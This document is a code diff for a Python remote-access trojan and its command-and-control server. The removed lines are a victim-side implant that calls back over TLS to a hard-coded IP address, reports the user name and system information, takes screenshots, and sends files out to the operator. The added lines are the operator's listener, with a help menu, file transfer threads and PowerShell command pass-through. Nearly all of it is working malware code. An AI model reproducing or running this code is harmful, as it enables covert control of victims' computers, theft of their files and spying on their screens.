@@ -1,160 +1,254 @@
-import os
-import socket
 import ssl
-import subprocess
-import time
+import socket
+import os
+import platform
+import threading
 import struct
 
-def q(host, port):
-    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-    context.check_hostname = False
-    context.verify_mode = ssl.CERT_NONE
+context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
 
-    while True:
+
+bindsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+bindsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+banner = """\033[35m
+                   ⠘⣷
+         ⢀⣤⣤⣤⣀⡀⠄⠄⠄⢸⡀
+          ⠙⠻⣗⢭⡙⠳⣦⡀⠘⡇⠄⠄⠄⣴⠇
+            ⠈⢷⡌⠣⡄⠄⢰⡇⠄⠄⡴⠁
+    ⣠⣴⣞⣛⣛⡛⠛⠛⠶⠄⢻⡆⠉⠄⢸⠄⢀⡜⠁⠄⠛⠛⠻⢦⣄
+   ⣼⠛⠛⠳⠶⣦⣍⠙⠲⢤⠄⠄⣿⠄⠄⡏⢠⠎⠄⣀⡤⠤⠒⠶⠂⠙⣧⡀
+   ⢿⡄⣿⠄⠄⠄⠉⢻⣄⣀⠄⠄⠛⠄⠸⠡⢋⡴⠊⢁⣠⣤⣶⣶⢤⣄⡘⣇
+   ⠙⠻⠆⣠⡶⠟⠋⠉⠉⠛⢶⣶⠖⠶⣦⡀⠠⣴⣯⣁⠄⠄⠙⢷⡈⠻⣿
+      ⣰⠏⢀⣋⣉⠉⠉⠲⡄⠙⣧⠄⠈⢃⣀⠄⠄⠉⠳⣄⠄⠈⣷⢀⡟
+      ⣿⠟⣿⠋⠉⠛⠷⡄⠸⠄⢹⡖⠛⠉⠉⠙⣷⣦⡀⢹⡆⠄⣿⡾⠁
+      ⢿⡄⢿⡀⠄⠄⠄⢰⣆⠄⠛⠄⢠⡆⠄⠄⠸⡏⢻⣼⡇⠄⠋
+       ⠻⣮⣷⡀⠄⠄⠄⠙⠶⣤⠶⠟⠁⠄⠄⢸⡇⢀⡿⠁
+         ⠉⠛⠁⠄⠄⠄⠄⣿⠄⠄⠄⠄⣠⣿⡴⠛
+            ⣠⣤⣤⣄⡀⣿    ⠉
+        ⢀⣴⠟⠉⣠⠶⠿⠿⣿
+     ⢀⣀⣴⠟⢁⣴⠟⠁   ⣿
+    ⠙⠿⣭⣤⡴⠟⠁     ⣿
+
+\033[m"""
+
+def connection():
+    connection = False
+    while connection == False:
         try:
-            print("Trying Connection...")
-            n = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            with context.wrap_socket(n, server_hostname=host) as p:
-                p.connect((host, port))
-                print(f"Conectado a {host}:{port} usando SSL")
-                whoami = subprocess.run(['whoami'], capture_output=True, text=True, check=True)
-                result = f"{whoami.stdout.strip()}"
-                p.sendall(result.encode())
+            print(banner)
+            print("-" *40)
+            print(f"           Binding Port: 443")
+            print("-" *40)
+            # Attenticating Connection
+            connection = True
+            # Listening the Connection
 
-                while True:
-                    try:
-                        command = p.recv(4096).decode('utf-8').strip()
+            bindsocket.bind(('', 9000))
+            bindsocket.listen(5)
 
-                        if command == "pwd":
-                            crd = os.getcwd()
-                            p.sendall(crd.encode('utf-8'))
+            client_socket, address = bindsocket.accept()
+            print(f"\033[32m[*] {address[0]} Connected in {address[1]} Port\033[m")
+            global conn
+            conn = context.wrap_socket(client_socket, server_side=True)
+            dir = conn.recv(4096).decode()
 
-                        elif command == "ls -la" or command == "ls":
-                            itens = subprocess.check_output('dir /a', shell=True, text=True)
-                            itens_bytes = itens.encode('utf-8')
-                            data_length = len(itens_bytes)
+            
+            while True:
+                
+                commands = input(f"\033[32m[+] {dir} >\033[m ")
 
-                            p.sendall(struct.pack('>I', data_length))
-
-                            p.sendall(itens_bytes)
-
-
-                        elif command == "sysinfo" or command == "systeminfo":
-                            itens = subprocess.check_output('systeminfo', shell=True, text=True)
-                            itens_bytes = itens.encode('utf-8')
-                            data_length = len(itens_bytes)
-
-                            p.sendall(struct.pack('>I', data_length))
-                            p.sendall(itens_bytes)
-
-
-                        elif command == 'cd ..':
-                            try:
-                                path_parent = os.path.dirname(os.getcwd())
-                                os.chdir(path_parent)
-                                response = os.getcwd()
-                                p.sendall(response.encode())
-
-                            except Exception as e:
-                                p.sendall(str(e).encode())
-
-                        elif command.startswith('cd '):
-                            try:
-                                path = command.split(' ', 1)[1]
-                                os.chdir(path)
-                                response = os.getcwd()
-                                p.sendall(response.encode('utf-8'))
-                            except Exception as e:
-                                p.sendall(str(e).encode('utf-8'))
+    
+                if commands == "pwd":
+                    conn.sendall(commands.encode('utf-8'))
+                    response = conn.recv(4096)
+                    print(response.decode('utf-8'))
+                
+                elif commands == "help":
+                    help_menu = """\033[33m
+|==========================================================|
+|                         HELP MENU                        |
+|==========================================================|
+|  Command               |            Description          |
+|==========================================================|
+|  cd (Dir)              |  Change Directory               |
+|  cd ..                 |  Go back a directory            |
+|  ls -la / ls           |  List all files in current      |
+|                        |  directory                      |
+|  exit                  |  Shutdown C2 Server             |
+|  pwd                   |  Show Current Directory         |
+|  print                 |  Do a Screenshot                |
+|  download              |  Download file to server        |
+|  upload                |  Upload file to target          |
+|  sysinfo/systeminfo    |  Show system information        |
+|  clear                 |  Clear terminal                 |
+|==========================================================|
+\033[m"""
+                    print(help_menu)
 
 
+                elif commands == "cd ..":
+                    conn.sendall(commands.encode('utf-8'))
+                    response = conn.recv(4096)
+                    print(response.decode('utf-8'))
+                
+                elif commands.startswith('cd '):
+                    conn.sendall(commands.encode('utf-8'))
+                    response = conn.recv(4096)
+                    print(response.decode('utf-8'))
+
+                elif commands == "ls -la" or commands == "ls":
+                    conn.sendall(commands.encode('utf-8'))
+
+                    raw_length = conn.recv(4)
+                    if raw_length:
+                        data_length = struct.unpack('>I', raw_length)[0]
 
 
-                        elif command.startswith('download '):
-                            parts = command.split(' ', 1)
-                            if len(parts) > 1:
-                                file_name = parts[1].strip()
-                                if os.path.exists(file_name):
-                                    def exfiltration_transfer():
-                                        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                                        context.check_hostname = False
-                                        context.verify_mode = ssl.CERT_NONE
-                                        exfiltration_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                                        with context.wrap_socket(exfiltration_socket,server_hostname=host) as exfil_conn:
-                                            exfil_conn.connect((host, 443))
-                                            exfil_conn.sendall(file_name.encode('utf-8'))
-                                            with open(file_name, "rb") as file:
-                                                while data := file.read(4096):
-                                                    exfil_conn.sendall(data)
-                                            print(f"File {file_name} send successfully!")
-                                            exfil_conn.close()
+                        data = b""
+                        while len(data) < data_length:
+                            packet = conn.recv(data_length - len(data))
+                            if not packet:
+                                break
+                            data += packet
 
-                                    exfiltration_transfer()
+                        print(data.decode('utf-8'))
 
 
-                        elif command.startswith('upload '):
-                            parts = command.split(' ', 1)
-                            if len(parts) > 1:
-                                file_name = parts[1].strip()
-                                print(file_name)
-                                host = "192.168.15.152"
-                                conn = None
-                                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                                context.check_hostname = False
-                                context.verify_mode = ssl.CERT_NONE
+
+
+                elif commands == "sysinfo" or commands == "systeminfo":
+                    conn.sendall(commands.encode('utf-8'))
+
+
+                    raw_length = conn.recv(4)
+                    if raw_length:
+                        data_length = struct.unpack('>I', raw_length)[0]
+
+
+                        data = b""
+                        while len(data) < data_length:
+                            packet = conn.recv(data_length - len(data))
+                            if not packet:
+                                break
+                            data += packet
+
+                        print(data.decode('utf-8'))
+
+
+                elif commands == "print":
+                    conn.sendall(commands.encode('utf-8'))
+                    response = conn.recv(4096)
+
+                    print(f"\033[32m[+] {response.decode('utf-8')}\033[m")
+                
+
+                elif commands.startswith("download "):
+                    def handle_file_transfer():
+                        transfer_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+                        transfer_context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
+
+                        transfer_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        transfer_socket.bind(('0.0.0.0', 443))
+                        transfer_socket.listen(1)
+                        print("\033[32m[+] Waiting connection to transfer file...\033[m")
+
+                        while True:
+                            client_socket, addr = transfer_socket.accept()
+                            with transfer_context.wrap_socket(client_socket, server_side=True) as conn:
                                 try:
-
-                                    infiltrate_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                                    conn = context.wrap_socket(infiltrate_socket, server_hostname=host)
-                                    conn.connect((host, 443))
-
                                     file_name = conn.recv(1024).decode('utf-8')
-                                    print(f"Downloading file: {file_name}")
-
-
-                                    with open(file_name, 'wb') as file:
+                                    with open(file_name, 'wb') as f:
                                         while True:
                                             data = conn.recv(4096)
                                             if not data:
                                                 break
-                                            file.write(data)
+                                            f.write(data)
+                                    print(f"\033[32m[+] File {file_name} received successfully from {addr}!\033[m")
                                 except Exception as e:
-                                    print(f"An error occurred: {e}")
+                                    print(f"\033[31m[!] Transference error: {e}\033[m")
                                 finally:
-
-                                    if conn:
-                                        conn.close()
+                                    conn.close()
 
 
 
-                        elif command == "print":
-                            import string
-                            import random
-                            import pyautogui
 
-                            size = 10
-                            ramdom_numbers = random.randint(0, 500)
-                            random_string = ''.join(random.choices(string.ascii_uppercase + string.digits, k=size))
-                            file_name = f'{random_string}{str(ramdom_numbers)}.png'
-                            file_path = os.path.join(r'C:\Windows\Temp', file_name)
-                            scs = pyautogui.screenshot()
-                            scs.save(file_path)
-                            result = f"Print successfully saved in Temp directory with name {file_name}".encode()
-                            p.sendall(result)
-
-                        elif command == "SERVER_SHUTDOWN":
-                            print("Shutting down. Trying to reconnect...")
-                            break
-
-                    except (socket.error, ssl.SSLError) as e:
-                        print(f"[!] Communication error: {e}")
-                        break
-
-        except Exception as e:
-            print(f"Connection Refused: {e}")
-            time.sleep(5)
+                    conn.sendall(commands.encode('utf-8'))
+                    print("\033[32m[+] Waiting file in 443 port\033[m")
+                    threading.Thread(target=handle_file_transfer, daemon=True).start()
 
 
-a = "192.168.15.152"
-b = 9000
-q(a, b)
+
+
+                elif commands.startswith('upload '):
+                    conn.sendall(commands.encode('utf-8'))
+                    parts = commands.split(' ', 1)
+                    if len(parts) > 1:
+                        file_name = parts[1].strip()
+                        if os.path.exists(file_name): 
+                            print(f"File exists: {os.path.exists(file_name)}")
+            
+                            def infiltration_transfer():
+                                transfer_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+                                transfer_context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
+
+
+                                transfer_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                transfer_socket.bind(('0.0.0.0', 443))
+                                transfer_socket.listen(1)
+                                print("\033[32m[+] Waiting for connection to transfer file...\033[m")
+
+                                try:
+
+                                    client_socket, addr = transfer_socket.accept()
+                                    print(f"\033[32m[+] Connection from {addr}")
+
+                                    with transfer_context.wrap_socket(client_socket, server_side=True) as conn:
+                                        try:
+
+                                            conn.sendall(file_name.encode('utf-8'))
+                                            
+                                            with open(file_name, 'rb') as f:
+                                                while data := f.read(4096):
+                                                    conn.sendall(data)
+                                            print(f"\033[32m[+] File {file_name} sent successfully!")
+                                        except Exception as e:
+                                            print(f"\033[31m[!] An error occurred during file transfer: {e}\033[m")
+                                except Exception as e:
+                                    print(f"\033[31m[!] An error occurred while accepting connection: {e}\033[m")
+                                finally:
+                                    transfer_socket.close()
+                                    
+                            threading.Thread(target=infiltration_transfer, daemon=True).start()
+                    
+
+                elif commands.startswith('powershell '):
+                    conn.sendall(commands.encode('utf-8'))
+                    response = conn.recv(4096)
+                    print(response.decode('utf-8'))
+
+
+            
+                elif commands == "exit":
+                    disconnect = "SERVER_SHUTDOWN"
+                    conn.sendall(disconnect.encode('utf-8'))
+                    response = conn.recv(4096)
+                    print(response.decode('utf-8'))                
+                    bindsocket.close()
+                    print("\033[31m[!] Shutting Down server. Client will try to connect again ...\033[m")
+                    break
+
+                elif commands == "clear":
+                    os.system("clear")
+
+        except KeyboardInterrupt:
+            print("\033[31m\n\n[!] Shutting Down server. Client will try to connect again ...\033[m")
+        if conn:
+            conn.sendall(b"SERVER_SHUTDOWN")  
+            conn.close()
+        bindsocket.close()
+
+
+connection()
+#shell()
